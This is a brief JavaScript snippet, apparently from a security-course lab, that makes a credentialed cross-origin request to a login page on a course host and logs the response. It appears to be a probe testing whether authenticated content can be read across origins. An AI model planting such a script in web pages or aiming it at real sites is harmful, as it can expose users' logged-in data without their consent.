var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','http://cs558shell.walls.ninja:49617/login',true);
req.withCredentials = true;
req.send();

function reqListener() {
    console.log(this.responseText);
};

console.log("The js is being loaded here")